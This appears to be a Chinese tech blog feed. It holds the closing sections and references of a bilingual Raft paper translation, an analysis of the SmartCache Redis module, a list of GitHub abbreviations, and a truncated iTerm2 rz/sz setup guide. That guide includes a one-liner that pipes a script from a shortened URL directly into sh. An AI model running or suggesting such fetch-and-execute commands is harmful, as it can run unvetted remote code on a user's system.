title="10、相关工作"></a>10、相关工作</h2><p>There have been numerous publications related to consensus algorithms, many of which fall into one of the following categories:</p><p>已经有许多与共识算法相关的出版物，其中许多属于以下类别之一：</p><ul><li>Lamport’s original description of Paxos [15], and attempts to explain it more clearly [16, 20, 21].</li><li>Elaborations of Paxos, which fill in missing details and modify the algorithm to provide a better foundation for implementation [26, 39, 13].</li><li>Systems that implement consensus algorithms, such as Chubby [2, 4], ZooKeeper [11, 12], and Spanner [6]. The algorithms for Chubby and Spanner have not been published in detail, though both claim to be based on Paxos. ZooKeeper’s algorithm has been published in more detail, but it is quite different from Paxos.</li><li>Performance optimizations that can be applied to Paxos [18, 19, 3, 25, 1, 27].</li><li>Oki and Liskov’s Viewstamped Replication (VR), an alternative approach to consensus developed around the same time as Paxos. The original description [29] was intertwined with a protocol for distributed transactions, but the core consensus protocol has been separated in a recent update [22]. VR uses a leaderbased approach with many similarities to Raft.</li></ul><br /><ul><li>Lamport 对 Paxos 的原始描述 [15]，并试图更清楚地解释它 [16, 20, 21]。</li><li>Paxos 的详细说明，填补缺失的细节并修改算法，为实现提供更好的基础 [26, 39, 13]。</li><li>实现共识算法的系统，例如 Chubby [2, 4]、ZooKeeper [11, 12] 和 Spanner [6]。 Chubby 和 Spanner 的算法尚未详细发布，但都声称基于 Paxos。 ZooKeeper 的算法已经更详细的公布了，但是和 Paxos 有很大的不同。</li><li>可应用于 Paxos [18, 19, 3, 25, 1, 27] 的性能优化。</li><li>Oki 和 Liskov 的 Viewstamped Replication (VR)，一种与 Paxos 大约同时发展的共识替代方法。 最初的描述 [29] 与分布式交易协议交织在一起，但在最近的更新 [22] 中，核心共识协议已被分离。 VR 使用基于领导者的方法，与 Raft 有许多相似之处。</li></ul><p>The greatest difference between Raft and Paxos is Raft’s strong leadership: Raft uses leader election as an essential part of the consensus protocol, and it concentrates as much functionality as possible in the leader. This approach results in a simpler algorithm that is easier to understand. For example, in Paxos, leader election is orthogonal to the basic consensus protocol: it serves only as a performance optimization and is not required for achieving consensus. However, this results in additional mechanism: Paxos includes both a two-phase protocol for basic consensus and a separate mechanism for leader election. In contrast, Raft incorporates leader election directly into the consensus algorithm and uses it as the first of the two phases of consensus. This results in less mechanism than in Paxos.</p><p>Raft 和 Paxos 最大的区别在于 Raft 的强大领导力：Raft 将领导选举作为共识协议的重要组成部分，并将尽可能多的功能集中在领导身上。 这种方法导致更简单的算法更容易理解。 例如，在 Paxos 中，领导者选举与基本共识协议是正交的：它仅用作性能优化，而不是达成共识所必需的。 然而，这导致了额外的机制：Paxos 包括用于基本共识的两阶段协议和用于领导者选举的单独机制。 相比之下，Raft 将领导者选举直接纳入共识算法，并将其用作共识的两个阶段中的第一个。 这导致比 Paxos 更少的机制。</p><p>Like Raft, VR and ZooKeeper are leader-based and therefore share many of Raft’s advantages over Paxos. However, Raft has less mechanism that VR or ZooKeeper because it minimizes the functionality in non-leaders. For example, log entries in Raft flow in only one direction: outward from the leader in AppendEntries RPCs. In VR log entries flow in both directions (leaders can receive log entries during the election process); this results in additional mechanism and complexity. The published description of ZooKeeper also transfers log entries both to and from the leader, but the implementation is apparently more like Raft [35].</p><p>与 Raft 一样，VR 和 ZooKeeper 也是基于领导者的，因此与 Paxos 相比，有许多 Raft 的优势。 然而，Raft 的机制比 VR 或 ZooKeeper 少，因为它最大限度地减少了非领导者的功能。 例如，Raft 中的日志条目仅向一个方向流动：从 AppendEntries RPC 中的领导者向外流动。 在 VR 中，日志条目是双向流动的（leader 可以在选举过程中收到日志条目）； 这会导致额外的机制和复杂性。 已发布的 ZooKeeper 描述也将日志条目传输到领导者和从领导者传输日志条目，但实现显然更像 Raft [35]。</p><p>Raft has fewer message types than any other algorithm for consensus-based log replication that we are aware of. For example, we counted the message types VR and ZooKeeper use for basic consensus and membership changes (excluding log compaction and client interaction, as these are nearly independent of the algorithms). VR and ZooKeeper each define 10 different message types, while Raft has only 4 message types (two RPC requests and their responses). Raft’s messages are a bit more dense than the other algorithms’, but they are simpler collectively. In addition, VR and ZooKeeper are described in terms of transmitting entire logs during leader changes; additional message types will be required to optimize these mechanisms so that they are practical.</p><p>相比较于上述我们提及的其他服务于日志复制的共识算法的算法，Raft 拥有更少的消息类型。例如，我们统计了一下VR 和 ZooKeeper 使用的用于基本共识需要和成员变更的消息类型数（不包括日志压缩和客户端交互，因为这些几乎独立于算法）。VR 和 ZooKeeper 都分别定义了 10 种不同的消息类型，相对的，Raft 只有 4 种消息类型（两种 RPC 请求和对应的响应）。Raft 的消息都稍微比其他算法的要信息量大，但是都很简单。另外，VR 和 ZooKeeper 都在领导人变更时传输了整个日志；所以为了能够实践中使用，额外的消息类型就很必要了。</p><p>Raft’s strong leadership approach simplifies the algorithm, but it precludes some performance optimizations. For example, Egalitarian Paxos (EPaxos) can achieve higher performance under some conditions with a leaderless approach [27]. EPaxos exploits commutativity in state machine commands. Any server can commit a command with just one round of communication as long as other commands that are proposed concurrently commute with it. However, if commands that are proposed concurrently do not commute with each other, EPaxos requires an additional round of communication. Because any server may commit commands, EPaxos balances load well between servers and is able to achieve lower latency than Raft in WAN settings. However, it adds significant complexity to Paxos.</p><p>Raft 的强领导人方法简化了整个算法，但是同时也妨碍了一些性能优化的方法。例如， Egalitarian Paxos （EPaxos）在某些没有领导人的情况下可以达到很高的性能。EPaxos 充分发挥了在状态机指令中的交换性。任何服务器都可以在一轮通信下就提交指令，只要其他同时被提交的指令和它进行沟通。然而，如果并发被提交的指令，互相之间没有进行通信沟通，那么 EPaxos 就需要额外的一轮通信。因为任何服务器都可能提交指令，EPaxos 在服务器之间的负载均衡做的很好，并且很容易在 WAN 网络环境下获得很低的延迟。但同时，它也在 Paxos 上增加了许多重要的复杂度。</p><p>Several different approaches for cluster membership changes have been proposed or implemented in other work, including Lamport’s original proposal [15], VR [22], and SMART [24]. We chose the joint consensus approach for Raft because it leverages the rest of the consensus protocol, so that very little additional mechanism is required for membership changes. Lamport’s α-based approach was not an option for Raft because it assumes consensus can be reached without a leader. In comparison to VR and SMART, Raft’s reconfiguration algorithm has the advantage that membership changes can occur without limiting the processing of normal requests; in contrast, VR stops all normal processing during configuration changes, and SMART imposes an α-like limit on the number of outstanding requests. Raft’s approach also adds less mechanism than either VR or SMART.</p><p>一些处理集群成员变换的方法已经被提出或者在其他的成果中被实现，包括 Lamport 最初的讨论，VR 和 SMART。我们选择使用联合共识（joint consensus）方法，是因为利用了共识协议，这样我们就只需要增加很少一部分机制就可以实现成员变更。 Lamport 的基于 α 的方法对于Raft并不适用，因为它假定共识可以不需要领导者就可以达到。和 VR 和 SMART 相比较，Raft 的重配置算法可以在不影响正常请求处理的情况下进行；相比较而言，VR 需要停止所有的处理请求。SMART 则引入了一个和 α 类似的方法，限制了请求处理的数量。同时，Raft 的方法需要更少的额外机制来实现。</p><h2 id="11、结论"><a href="#11、结论" class="headerlink" title="11、结论"></a>11、结论</h2><p>Algorithms are often designed with correctness, efficiency, and&#x2F;or conciseness as the primary goals. Although these are all worthy goals, we believe that understandability is just as important. None of the other goals can be achieved until developers render the algorithm into a practical implementation, which will inevitably deviate from and expand upon the published form. Unless developers have a deep understanding of the algorithm and can create intuitions about it, it will be difficult for them to retain its desirable properties in their implementation.</p><p>算法的设计通常以正确性、效率 和&#x2F;或 简洁性为主要目标。 尽管这些都是有价值的目标，但我们认为可理解性同样重要。 在开发人员将算法转化为实际的实现之前，其他任何目标都无法实现，这将不可避免地偏离和扩展已发布的形式。 除非开发人员对算法有深刻的理解并且可以对它产生直觉，否则他们将很难在他们的实现中保留其理想的属性。</p><p>In this paper we addressed the issue of distributed consensus, where a widely accepted but impenetrable algorithm, Paxos, has challenged students and developers for many years. We developed a new algorithm, Raft, which we have shown to be more understandable than Paxos. We also believe that Raft provides a better foundation for system building. Using understandability as the primary design goal changed the way we approached the design of Raft; as the design progressed we found ourselves reusing a few techniques repeatedly, such as decomposing the problem and simplifying the state space. These techniques not only improved the understandability of Raft but also made it easier to convince ourselves of its correctness.</p><p>在本文中，我们解决了分布式共识的问题，其中一种被广泛接受但难以理解的算法 Paxos 多年来一直在挑战学生和开发人员。 我们开发了一种新算法 Raft，我们已经证明它比 Paxos 更容易理解。 我们也相信 Raft 为系统构建提供了更好的基础。 使用可理解性作为主要设计目标改变了我们处理 Raft 设计的方式； 随着设计的进展，我们发现自己重复使用了一些技术，例如分解问题和简化状态空间。 这些技术不仅提高了 Raft 的可理解性，而且更容易让我们相信它的正确性。</p><h2 id="12、致谢"><a href="#12、致谢" class="headerlink" title="12、致谢"></a>12、致谢</h2><p>The user study would not have been possible without the support of Ali Ghodsi, David Mazieres, and the students of CS 294-91 at Berkeley and CS 240 at Stanford. Scott Klemmer helped us design the user study, and Nelson Ray advised us on statistical analysis. The Paxos slides for the user study borrowed heavily from a slide deck originally created by Lorenzo Alvisi. Special thanks go to David Mazieres and Ezra Hoch for finding subtle bugs in Raft. Many people provided helpful feedback on the paper and user study materials, including Ed Bugnion, Michael Chan, Hugues Evrard,Daniel Giffin, Arjun Gopalan, Jon Howell, Vimalkumar Jeyakumar, Ankita Kejriwal, Aleksandar Kracun, Amit Levy, Joel Martin, Satoshi Matsushita, Oleg Pesok, David Ramos, Robbert van Renesse, Mendel Rosenblum, Nicolas Schiper, Deian Stefan, Andrew Stone, Ryan Stutsman, David Terei, Stephen Yang, Matei Zaharia, 24 anonymous conference reviewers (with duplicates), and especially our shepherd Eddie Kohler. Werner Vogels tweeted a link to an earlier draft, which gave Raft significant exposure. This work was supported by the Gigascale Systems Research Center and the Multiscale Systems Center, two of six research centers funded under the Focus Center Research Program, a Semiconductor Research Corporation program, by STARnet, a Semiconductor Research Corporation program sponsored by MARCO and DARPA, by the National Science Foundation under Grant No. 0963859, and by grants from Facebook, Google, Mellanox, NEC, NetApp, SAP, and Samsung. Diego Ongaro is supported by The Junglee Corporation Stanford Graduate Fellowship.</p><p>如果没有 Ali Ghodsi、David Mazieres 和伯克利 CS 294-91 和斯坦福大学 CS 240 学生的支持，用户研究是不可能的。 Scott Klemmer 帮助我们设计了用户研究，Nelson Ray 为我们提供了统计分析方面的建议。用于用户研究的 Paxos 幻灯片大量借用了最初由 Lorenzo Alvisi 创建的幻灯片。特别感谢 David Mazieres 和 Ezra Hoch 在 Raft 中发现了细微的错误。许多人对论文和用户研究材料提供了有用的反馈，包括 Ed Bugnion、Michael Chan、Hugues Evrard、Daniel Giffin、Arjun Gopalan、Jon Howell、Vimalkumar Jeyakumar、Ankita Kejriwal、Aleksandar Kracun、Amit Levy、Joel Martin、Satoshi Matsushita， Oleg Pesok、David Ramos、Robbert van Renesse、Mendel Rosenblum、Nicolas Schiper、Deian Stefan、Andrew Stone、Ryan Stutsman、David Terei、Stephen Yang、Matei Zaharia，24 位匿名会议评论员（有重复），尤其是我们的牧羊人 Eddie Kohler。 Werner Vogels 在推特上发布了一个指向早期草案的链接，这让 Raft 得到了大量曝光。这项工作得到了千兆系统研究中心和多尺度系统中心的支持，这两个研究中心是在焦点中心研究计划（一个半导体研究公司计划）下资助的六个研究中心中的两个，由 STARnet（一个由 MARCO 和 DARPA 赞助的半导体研究公司计划） 0963859 号美国国家科学基金会，以及 Facebook、谷歌、Mellanox、NEC、NetApp、SAP 和三星的资助。 Diego Ongaro 得到 Junglee Corporation 斯坦福大学研究生奖学金的支持。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><div><p>[1]. BOLOSKY, W. J., BRADSHAW, D., HAAGENS, R. B., KUSTERS, N. P., AND LI, P. Paxos replicated state machines as the basis of a high-performance data store. In Proc. NSDI’11, USENIX Conference on Networked Systems Design and Implementation (2011), USENIX, pp. 141–154.<br>[2]. BURROWS, M. The Chubby lock service for looselycoupled distributed systems. In Proc. OSDI’06, Symposium on Operating Systems Design and Implementation (2006), USENIX, pp. 335–350.<br>[3]. CAMARGOS, L. J., SCHMIDT, R. M., AND PEDONE, F. Multicoordinated Paxos. In Proc. PODC’07, ACM Symposium on Principles of Distributed Computing (2007), ACM, pp. 316–317.<br>[4]. CHANDRA, T. D., GRIESEMER, R., AND REDSTONE, J. Paxos made live: an engineering perspective. In Proc. PODC’07, ACM Symposium on Principles of Distributed Computing (2007), ACM, pp. 398–407.<br>[5]. CHANG, F., DEAN, J., GHEMAWAT, S., HSIEH, W. C., WALLACH, D. A., BURROWS, M., CHANDRA, T., FIKES, A., AND GRUBER, R. E. Bigtable: a distributed storage system for structured data. In Proc. OSDI’06, USENIX Symposium on Operating Systems Design and Implementation (2006), USENIX, pp. 205–218.<br>[6]. CORBETT, J. C., DEAN, J., EPSTEIN, M., FIKES, A., FROST, C., FURMAN, J. J., GHEMAWAT, S., GUBAREV, A., HEISER, C., HOCHSCHILD, P., HSIEH, W., KANTHAK, S., KOGAN, E., LI, H., LLOYD, A., MELNIK, S., MWAURA, D., NAGLE, D., QUINLAN, S., RAO, R., ROLIG, L., SAITO, Y., SZYMANIAK, M., TAYLOR, C., WANG, R., AND WOODFORD, D. Spanner: Google’s globally-distributed database. In Proc. OSDI’12, USENIX Conference on Operating Systems Design and Implementation (2012), USENIX, pp. 251–264.<br>[7]. COUSINEAU, D., DOLIGEZ, D., LAMPORT, L., MERZ, S., RICKETTS, D., AND VANZETTO, H. TLA+ proofs. In Proc. FM’12, Symposium on Formal Methods (2012), D. Giannakopoulou and D. M´ery, Eds., vol. 7436 of Lecture Notes in Computer Science, Springer, pp. 147–154.<br>[8]. GHEMAWAT, S., GOBIOFF, H., AND LEUNG, S.-T. The Google file system. In Proc. SOSP’03, ACM Symposium on Operating Systems Principles (2003), ACM, pp. 29–43.<br>[9]. GRAY, C., AND CHERITON, D. Leases: An efficient faulttolerant mechanism for distributed file cache consistency. In Proceedings of the 12th ACM Ssymposium on Operating Systems Principles (1989), pp. 202–210.<br>[10]. HERLIHY, M. P., AND WING, J. M. Linearizability: a correctness condition for concurrent objects. ACM Transactions on Programming Languages and Systems 12 (July 1990), 463–492.<br>[11]. HUNT, P., KONAR, M., JUNQUEIRA, F. P., AND REED, B. ZooKeeper: wait-free coordination for internet-scale systems. In Proc ATC’10, USENIX Annual Technical Conference (2010), USENIX, pp. 145–158.<br>[12]. JUNQUEIRA, F. P., REED, B. C., AND SERAFINI, M. Zab: High-performance broadcast for primary-backup systems. In Proc. DSN’11, IEEE&#x2F;IFIP Int’l Conf. on Dependable Systems &amp; Networks (2011), IEEE Computer Society, pp. 245–256.<br>[13]. KIRSCH, J., AND AMIR, Y. Paxos for system builders. Tech. Rep. CNDS-2008-2, Johns Hopkins University, 2008.<br>[14]. LAMPORT, L. Time, clocks, and the ordering of events in a distributed system. Commununications of the ACM 21, 7 (July 1978), 558–565.<br>[15]. LAMPORT, L. The part-time parliament. ACM Transactions on Computer Systems 16, 2 (May 1998), 133–169.<br>[16]. LAMPORT, L. Paxos made simple. ACM SIGACT News 32, 4 (Dec. 2001), 18–25.<br>[17]. LAMPORT, L. Specifying Systems, The TLA+ Language and Tools for Hardware and Software Engineers. AddisonWesley, 2002.<br>[18]. LAMPORT, L. Generalized consensus and Paxos. Tech. Rep. MSR-TR-2005-33, Microsoft Research, 2005.<br>[19]. LAMPORT, L. Fast paxos. Distributed Computing 19, 2 (2006), 79–103.<br>[20]. LAMPSON, B. W. How to build a highly available system using consensus. In Distributed Algorithms, O. Baboaglu and K. Marzullo, Eds. Springer-Verlag, 1996, pp. 1–17.<br>[21]. LAMPSON, B. W. The ABCD’s of Paxos. In Proc. PODC’01, ACM Symposium on Principles of Distributed Computing (2001), ACM, pp. 13–13.<br>[22]. LISKOV, B., AND COWLING, J. Viewstamped replication revisited. Tech. Rep. MIT-CSAIL-TR-2012-021, MIT, July 2012.<br>[23]. LogCabin source code. <a href="http://github.com/logcabin/logcabin">http://github.com/logcabin/logcabin</a>.<br>[24]. LORCH, J. R., ADYA, A., BOLOSKY, W. J., CHAIKEN, R., DOUCEUR, J. R., AND HOWELL, J. The SMART way to migrate replicated stateful services. In Proc. EuroSys’06, ACM SIGOPS&#x2F;EuroSys European Conference on Computer Systems (2006), ACM, pp. 103–115.<br>[25]. MAO, Y., JUNQUEIRA, F. P., AND MARZULLO, K. Mencius: building efficient replicated state machines for WANs. In Proc. OSDI’08, USENIX Conference on Operating Systems Design and Implementation (2008), USENIX, pp. 369–384.<br>[26]. MAZIERES , D. Paxos made practical. http: <a href="https://www.scs.stanford.edu/%CB%9Cdm/home/">https://www.scs.stanford.edu/˜dm/home/</a> papers&#x2F;paxos.pdf, Jan. 2007.<br>[27]. MORARU, I., ANDERSEN, D. G., AND KAMINSKY, M. There is more consensus in egalitarian parliaments. In Proc. SOSP’13, ACM Symposium on Operating System Principles (2013), ACM.<br>[28]. Raft user study. <a href="http://ramcloud.stanford.edu/~ongaro/userstudy/">http://ramcloud.stanford.edu/~ongaro/userstudy/</a>.<br>[29]. OKI, B. M., AND LISKOV, B. H. Viewstamped replication: A new primary copy method to support highly-available distributed systems. In Proc. PODC’88, ACM Symposium on Principles of Distributed Computing (1988), ACM, pp. 8–17.<br>[30]. O’NEIL, P., CHENG, E., GAWLICK, D., AND ONEIL, E. The log-structured merge-tree (LSM-tree). Acta Informatica 33, 4 (1996), 351–385.<br>[31]. ONGARO, D. Consensus: Bridging Theory and Practice. PhD thesis, Stanford University, 2014 (work in progress). <a href="http://ramcloud.stanford.edu/~ongaro/thesis.pdf">http://ramcloud.stanford.edu/~ongaro/thesis.pdf</a>.<br>[32]. ONGARO, D., AND OUSTERHOUT, J. In search of an understandable consensus algorithm. In Proc ATC’14, USENIX Annual Technical Conference (2014), USENIX.<br>[33]. OUSTERHOUT, J., AGRAWAL, P., ERICKSON, D., KOZYRAKIS, C., LEVERICH, J., MAZIERES &#96; , D., MITRA, S., NARAYANAN, A., ONGARO, D., PARULKAR, G., ROSENBLUM, M., RUMBLE, S. M., STRATMANN, E., AND STUTSMAN, R. The case for RAMCloud. Communications of the ACM 54 (July 2011), 121–130.<br>[34]. Raft consensus algorithm website. <a href="http://raftconsensus.github.io/">http://raftconsensus.github.io</a><br>[35]. REED, B. Personal communications, May 17, 2013.<br>[36]. ROSENBLUM, M., AND OUSTERHOUT, J. K. The design and implementation of a log-structured file system. ACM Trans. Comput. Syst. 10 (February 1992), 26–52.<br>[37]. SCHNEIDER, F. B. Implementing fault-tolerant services using the state machine approach: a tutorial. ACM Computing Surveys 22, 4 (Dec. 1990), 299–319<br>[38]. SHVACHKO, K., KUANG, H., RADIA, S., AND CHANSLER, R. The Hadoop distributed file system. In Proc. MSST’10, Symposium on Mass Storage Systems and Technologies (2010), IEEE Computer Society, pp. 1–10.<br>[39]. VAN RENESSE, R. Paxos made moderately complex. Tech. rep., Cornell University, 2012.</p></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 共识算法 </category>
          
          <category> Raft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> Raft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - SmartCache</title>
      <link href="/2021/04/15/redismodule-smartcache/"/>
      <url>/2021/04/15/redismodule-smartcache/</url>
      
        <content type="html"><![CDATA[<p><code>SmartCache</code> 是一款基于 <code>RedisModule</code> 实现的数据缓存模块，目前仅支持与 MySQL 进行数据缓存交互。在客户端访问数据的时候，如果该数据不存在于 Redis 中，则 Redis 会向配置的 MySQL 发起数据请求，将数据缓存到本地，并设置一定的过期时间，之后将缓存的数据发送给客户端，从而实现了 <code>Read-Through Cache</code> 这种缓存模式。缓存的数据经过格式化处理（格式化方式比较简单，参考下文），因此客户端读取到访问数据后还需要进行额外的转换解析。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/fcerbell/redismodule-smartcache/">https://github.com/fcerbell/redismodule-smartcache/</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>scache.create : 创建一个新的缓存信息，通过指定的 mysql 地址信息，该缓存维护一个与mysql的连接信息；</li><li>scache.list : 遍历出所有创建的缓存信息（返回缓存信息标示）；</li><li>scache.info : 获取指定的缓存信息（缓存信息使用链表存储，数据量较多时访问可能有性能瓶颈）；</li><li>scache.test : 验证特定的缓存信息与 mysql 的连接是否 ok （缓存信息使用链表存储，数据量较多时访问可能有性能瓶颈）；</li><li>scache.flush : 暂不支持；</li><li>scache.delete : 删除指定的缓存信息，同时断开与 mysql 的连接；</li><li>scache.getvalue : 从缓存中获取对应的值；</li><li>scache.getmeta : 从缓存中获取对应的值的属性；</li></ul><h3 id="2-2、数据结构"><a href="#2-2、数据结构" class="headerlink" title="2.2、数据结构"></a>2.2、数据结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 缓存对象的结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">CacheDetails_s</span> &#123;<br>    <span class="hljs-type">char</span>* cachename;              <span class="hljs-comment">// 设置的缓存名，独立无二的缓存标识符</span><br>    <span class="hljs-type">uint16_t</span> ttl;                 <span class="hljs-comment">// 值到期前的默认生存时间（以秒为单位）</span><br>    <span class="hljs-type">char</span>* dbhost;                 <span class="hljs-comment">// 数据库服务器的主机IP 地址或 DNS 名称</span><br>    <span class="hljs-type">uint16_t</span> dbport;              <span class="hljs-comment">// port数据库服务器的 TCP 端口（通常为 3306）</span><br>    <span class="hljs-type">char</span>* dbname;                 <span class="hljs-comment">// 需要连接的数据库名</span><br>    <span class="hljs-type">char</span>* dbuser;                 <span class="hljs-comment">// 连接到数据库的用户登录名</span><br>    <span class="hljs-type">char</span>* dbpass;                 <span class="hljs-comment">// 密码连接数据库的密码</span><br>    MYSQL* dbhandle;              <span class="hljs-comment">// 连接mysql的句柄</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">CacheDetails_s</span>* next;  <span class="hljs-comment">// 记录下一个缓存对象</span><br>&#125; CacheDetails;<br></code></pre></td></tr></table></figure><h2 id="三、数据缓存读取流程"><a href="#三、数据缓存读取流程" class="headerlink" title="三、数据缓存读取流程"></a>三、数据缓存读取流程</h2><h3 id="3-1、数据缓存流程"><a href="#3-1、数据缓存流程" class="headerlink" title="3.1、数据缓存流程"></a>3.1、数据缓存流程</h3><p>相关函数 : <code>SCachePopulate</code> ，主要流程如下：</p><ul><li>向对应 mysql 发送 query 命令（调用 <code>mysql_query</code> 接口），并接受返回结果（异常则直接返回）；</li><li>拼接两个缓存信息 key ，<code>cachename::query::meta</code> 和 <code>cachename::query::value</code> ；</li><li>解析 mysql 的返回值，并将数据存储到两个 key 中：<ul><li>将返回结果每个字段及其属性存储进 <code>cachename::query::meta</code> 中：<ul><li>相关命令 : <code>RPUSH cachename::query::meta name|type</code> ；</li><li>数据的格式为 : 即 <code>name|type</code> 的内容为 mysql 返回信息的对应字段的名称和类型；</li></ul></li><li>将返回结果每一行数据依次存储进 <code>cachename::query::value</code> 中：<ul><li>相关命令 : <code>RPUSH cachename::query::value field1|field2|field3</code> ； </li><li>数据的格式 : 即 <code>field1|field2|field3</code> 的内容为 mysql 返回结果中一行中的每一列的数据拼接成的字符串，分隔符为 <code>|</code> ；</li></ul></li></ul></li></ul><h3 id="3-2、数据读取流程"><a href="#3-2、数据读取流程" class="headerlink" title="3.2、数据读取流程"></a>3.2、数据读取流程</h3><ul><li><code>scache.getvalue</code> 执行流程 :<ol><li>拼接特殊 key，格式为 : <code>cachename::query::value</code> （其中 <code>cachename</code> 和 <code>query</code> 是命令中传入的参数）；</li><li>在本地DB中执行 <code>LRANGE cachename::query::value 0 -1</code> 获取所有数据；</li><li>如果数据为空，则调用 <code>SCachePopulate</code> 函数填充数据后再次执行 <code>LRANGE cachename::query::value 0 -1</code> 获取数据；</li><li>最终拿到的数据就是一批 <code>field1|field2|field3</code> 数据的数组（类似于 sql 指令的多行返回值）；</li></ol></li><li><code>scache.getmeta</code> 执行流程 :<ol><li>拼接特殊 key，格式为 : <code>cachename::query::meta</code> （其中 <code>cachename</code> 和 <code>query</code> 是命令中传入的参数）；</li><li>在本地DB中执行 <code>LRANGE cachename::query::meta 0 -1</code> 获取所有数据；</li><li>如果数据为空，则调用 <code>SCachePopulate</code> 函数填充数据后再次执行 <code>LRANGE cachename::query::meta 0 -1</code> 获取数据；</li><li>最终拿到的数据就是一批 <code>name|type</code> 数据的数组（类似于 sql 指令的返回值对应的每一列的属性信息）；</li></ol></li></ul><h2 id="四、问题与思考"><a href="#四、问题与思考" class="headerlink" title="四、问题与思考"></a>四、问题与思考</h2><h3 id="4-1、问题"><a href="#4-1、问题" class="headerlink" title="4.1、问题"></a>4.1、问题</h3><ul><li>在新创建一个缓存对象的时候，会阻塞当前客户端并创建一个线程（通过函数 <code>SCacheCreate_ThreadMain</code> ）来异步连接 mysql 服务，但是在后续数据查询的查询的过程中，好像是同步的查询请求，因此这里会阻塞其他客户端的访问，从而影响访问性能；</li><li>缓存的数据经过格式化处理，客户端无法直接使用，需要进行解析；</li><li>缓存数据作为独立 key 的数据进行存储，并且暂时还未实现 <code>scache.flush</code> 的功能，因此需要取消缓存数据之后的数据冗余问题；</li><li>使用链表存储缓存对象，在缓存对象数据量较大的场景下不可避免的会有性能问题，这一点可以做一些优化；</li></ul><h3 id="4-2、思考"><a href="#4-2、思考" class="headerlink" title="4.2、思考"></a>4.2、思考</h3><ul><li>通过封装缓存服务与存储服务的交互逻辑，提供了一种更加简单的缓存模型，但是往往业务的缓存方式不是这么简单直接，因此在实际的使用中可能并不适合；</li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> SmartCache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub黑话/简写大全</title>
      <link href="/2021/02/13/github-keyword/"/>
      <url>/2021/02/13/github-keyword/</url>
      
        <content type="html"><![CDATA[<p>使用 GitHub 的过程中经常会遇到一些英文的简写，这些简写能够很好的简略高效的表达自己的想法，并且随着广泛的使用已经得到了大家的共识，这里将会介绍一些常用的英文简写。</p><h1 id="一、黑话-简写集"><a href="#一、黑话-简写集" class="headerlink" title="一、黑话&#x2F;简写集"></a>一、黑话&#x2F;简写集</h1><ul><li>PR ： 全称为 Pull Request ，合并请求；</li><li>CR ： 全称为 Code Review ，代码审查；</li><li>LGTM ： 全称为 Looks Good To Me ，我觉得没有问题；</li><li>WIP ： 全称为 Work In Progress ，进展中；</li><li>AFAIK ： 全称为 As Far As I Know ，据我所知；</li><li>AFAICT ： 全称为 As Far As I Can Tell ，据我所知；</li><li>TBH ： 全称为 To Be Honest ， 老实说；</li><li>ACK ： 全称为 acknowledgement ，接受&#x2F;同意；</li><li>FYI ： 全称为 For Your Information ，仅供参考；</li><li>PTAL ： 全称为 Please Take A Look ，请看一看；</li><li>SGTM ： 全称为 Sounds Good To Me ，我觉得没有问题；</li><li>IMO ： 全称为 In My Opinion ，在我看来&#x2F;依我所见；</li><li>IMHO ： 全称为 In My Humble Opinion ，依我拙见；</li><li>DNM ： 全称为 Do Not Merge ， 不要合并；</li><li>TL;DR ： 全称为 Too Long; Don’t Read. ，太长了、还没看；</li></ul><h1 id="二、参考链接"><a href="#二、参考链接" class="headerlink" title="二、参考链接"></a>二、参考链接</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/79492703">Github 黑话大全</a></li><li><a href="https://gythialy.github.io/github-keyword/">GitHub review 常用缩写</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm2配置rz/sz上传下载文件</title>
      <link href="/2020/11/02/iterm2-rzsz/"/>
      <url>/2020/11/02/iterm2-rzsz/</url>
      
        <content type="html"><![CDATA[<h2 id="一、iTerm2的Triggers功能"><a href="#一、iTerm2的Triggers功能" class="headerlink" title="一、iTerm2的Triggers功能"></a>一、iTerm2的Triggers功能</h2><p>关于iTerm2的 <a href="https://iterm2.com/documentation/2.1/documentation-triggers.html">Triggers</a> 功能，官方的介绍是：</p><blockquote><p>A trigger is an action that is performed when text matching some regular expression is received in a terminal session.</p></blockquote><p>即：触发器是在终端会话中收到与某个正则表达式匹配的文本时执行的动作。</p><h2 id="二、配置rs-zs"><a href="#二、配置rs-zs" class="headerlink" title="二、配置rs&#x2F;zs"></a>二、配置rs&#x2F;zs</h2><h3 id="2-1、一键脚本"><a href="#2-1、一键脚本" class="headerlink" title="2.1、一键脚本"></a>2.1、一键脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -sSLf https://git.io/bugwz-sh-iterm2-rzsz | sh  <br></code></pre></td></tr></table></figure><p><strong>该脚本作用如下：</strong></p><ul><li>使用指令 <code>brew install lrzsz</code> 安装 <code>lrzsz</code> 软件；</li><li>下载 <code>iterm2-send-zmodem.sh</code> 和 <code>iterm2-recv-zmodem.sh</code> 到 <code>/usr/local/bin/</code> 目录；</li><li>提示在 iTerm2 中进行后续的操作步骤；</li></ul><h3 id="2-2、单独操作步骤"><a href="#2-2、单独操作步骤" class="headerlink" title="2.2、单独操作步骤"></a>2.2、单独操作步骤</h3><ul><li>安装lrzsz：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">brew install lrzsz<br></code></pre></td></tr></table></figure><ul><li>在 <code>/usr/local/bin</code> 目录中新增<code>iterm2-send-zmodem.sh</code> 